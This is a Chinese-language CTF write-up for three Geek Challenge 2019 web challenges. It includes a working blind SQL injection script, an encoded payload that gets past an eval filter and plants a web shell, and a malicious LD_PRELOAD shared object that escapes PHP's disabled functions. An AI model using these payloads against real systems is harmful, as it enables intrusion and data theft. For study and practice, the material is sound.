# 极客大挑战 2019

## Web

### BuyFlag

通过查看 `index.php` 源代码可以发现 `pay.php`，通过查看 `pay.php` 源代码可以发现以下内容

```php
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

通过构造 payload `password="404"` 发现并没有什么反应，然后继续在 NetWork 里面寻找答案。在寻找的过程中，发现 Request Headers 内包含 Cookie `user=0` ，故尝试修改为 `user=1` 后出现新提示 Wrong Password。因此重新构造 payload `password=404a` 发现成功力，但是提示需要给钱（

> is\_numeric() 函数用于检测变量是否为数字或数字字符串
>
> 但当一个整型和一个其他类型行比较的时候，会先把其他类型数字化再比，因此可以通过空字符 `%00` 或字母实现绕过
>
> strcmp() 函数用于比较两个字符串
>
> 若传入的参数为数组则返回 NULL ，NULL==0 为 bool(true)，因此可以通过传入数组进行绕过

尝试构造 payload `money=100000000` 发现提示 Nember lenth is too long，故修改 payload 为 `money[]=1`

### FinalSQL

通过测试发现并不存在单双引号，空格、`and` 也被过滤了，`/**/` 绕过也不行，并不存在报错注入，尝试布尔注入。

```python
import time
import requests

url = 'http://f5e437d3-ba10-41e1-a677-dab0531a7037.node4.buuoj.cn:81/search.php'
results = []
session = requests.Session()

for i in range(1,43):
    start = 32
    end = 127
    for j in range(start, end):
        mid = (start + end) // 2
        data = {"id": f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})"}
        time.sleep(0.1)
        ret = session.get(url, params=data)
        #print(ret.text)
        if 'NO!' in ret.text:
            start = mid
        else:
            end = mid
        if (end - start) <= 1:
            results.append(chr(end))
            print(''.join(results))
            break
```

可以得到表名 `F1naI1y,Flaaaaag` ，通过修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flaaaaag')),{i},1))>{mid})"}
```

可以得到列名 `id,fl4gawsl` ，通过修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),{i},1))>{mid})"}
```

得到回显 `NO!!Not!this!!Click!others~~~,yingyingying` ，看来被骗了，那就修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))>{mid})"}
```

得到回显 `id,username,password` ，通过修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(username))from(F1naI1y)),{i},1))>{mid})"}
```

得到回显 `mygod,welcome,site,site,site,site,Syc,finally,flag` ，看来离成功更进一步了（确信），修改 data 如下

```python
data = {"id": f"0^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))>{mid})"}
```

得到回显 `flag{301e4296-b8db-462e-a4e0-6253e9b8dafe}` 。

### RCE ME

题目如下。

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(strlen($code)>40){
        die("This is too Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
// ?>
```

限制条件如下：

1. Payload 长度不超过 40 ；
2. Payload 不包含数字和字母。

因此尝试用取反 URLEncode 编码绕过，通过以下方式构造 Payload 。

```php
echo urlencode(~"assert");
// %9E%8C%8C%9A%8D%8B
echo urlencode(~'eval($_POST[1]);');
// %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4
// Payload: code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
```

即可通过蚁剑发现文件 `readflag` ，但是它是一个文件并且通过蚁剑的 shell 无法执行，猜测需要绕过 disable functions ，先构造 Payload 如下来找出 disable functions 的值。

```php
echo urlencode(~"phpinfo");
// %8F%97%8F%96%91%99%90
// Payload: code=(~%8F%97%8F%96%91%99%90)();
```

可以得到被禁用的方法如下：

* pcntl\_alarm
* pcntl\_fork
* pcntl\_waitpid
* pcntl\_wait
* pcntl\_wifexited
* pcntl\_wifstopped
* pcntl\_wifsignaled
* pcntl\_wifcontinued
* pcntl\_wexitstatus
* pcntl\_wtermsig
* pcntl\_wstopsig
* pcntl\_signal
* pcntl\_signal\_get\_handler
* pcntl\_signal\_dispatch
* pcntl\_get\_last\_error
* pcntl\_strerror
* pcntl\_sigprocmask
* pcntl\_sigwaitinfo
* pcntl\_sigtimedwait
* pcntl\_exec
* pcntl\_getpriority
* pcntl\_setpriority
* pcntl\_async\_signals
* system
* exec
* shell\_exec
* popen
* proc\_open
* passthru
* symlink
* link
* syslog
* imap\_open
* ld
* dl

可以利用环境变量 LD\_PRELOAD 劫持系统函数，让外部程序加载恶意 \*.so ，达到执行系统命令的效果，先编写恶意类如下。

```c
// ld.c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("/readflag > /tmp/readflag");
}
```

通过以下命令进行编译为共享对象。

```shell
gcc -shared -fPIC ld.c -o ld.so
```

将该恶意文件上传至 `/tmp` 中，并构造 Payload 如下。

```
params: code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4);
body: 1=putenv("LD_PRELOAD=/tmp/ld.so");mail("","","","");
```

之后就能在蚁剑通过查看 `/tmp/readflag` 得到 flag 。
